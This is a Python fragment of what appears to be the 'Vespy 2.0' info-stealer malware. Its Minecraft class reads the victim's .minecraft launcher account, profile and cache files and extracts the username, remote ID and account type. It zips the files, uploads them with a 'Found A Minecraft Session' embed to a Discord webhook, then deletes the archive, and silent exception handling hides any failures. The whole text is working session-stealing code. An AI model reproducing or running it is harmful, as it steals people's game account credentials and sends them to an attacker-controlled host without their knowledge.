class Minecraft:

    def __init__(self):
        try:
            self.content = ""
            path = f"C:\\Users\\{user}\\AppData\\Roaming\\.minecraft"
            try:
                logs = ['launcher_accounts.json', 'usercache.json', 'launcher_profiles.json', 'launcher_log.txt']
                self.user = open(path+"\\usercache.json").read().split('[{"name":"')[1].split('",')[0]
                self.idd = open(path+"\\launcher_accounts.json").read().split('"remoteId" : "')[1].split('",')[0]
                self.typE = open(path+"\\launcher_accounts.json").read().split('"type" : "')[1].split('",')[0]
                with ZipFile(path+"\\Minecraft.zip",'w') as z:
                    for i in logs:
                        self.content += f"{i}\n"
                        z.write(path+"\\"+i)
                    z.close()
            except:pass
            self.send(path+"\\Minecraft.zip")
        except:
            pass
    
    def send(self,_):
        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        webhook.add_file(file=open(_,'rb').read(),filename="Minecraft.zip")
        webhook.execute()

        webhook = DiscordWebhook(url=wbh, username="Vespy 2.0", avatar_url=r"https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png")
        embed = DiscordEmbed(title=f"Minecraft Session", description=f"Found A Minecraft Session", color='4300d1')
        embed.set_author(name="author : vesper", icon_url=r'https://cdn.discordapp.com/attachments/1037900641164611659/1052760729196970125/forvespyservero.png')
        embed.set_footer(text='Vespy 2.0 | by : vesper')
        embed.set_timestamp()
        embed.add_embed_field(name=f":green_square: Account of :ㅤㅤㅤ", value=f"``{self.user}``")
        embed.add_embed_field(name=f":video_game: Type :ㅤㅤㅤ", value=f"``{self.typE}``")
        embed.add_embed_field(name=f":id: Remote ID :ㅤㅤㅤ", value=f"``{self.idd}``")
        embed.add_embed_field(name=f"\n:open_file_folder: Files Found", value=f"```{self.content}```")
        webhook.add_embed(embed)
        webhook.execute()
        os.remove(_)
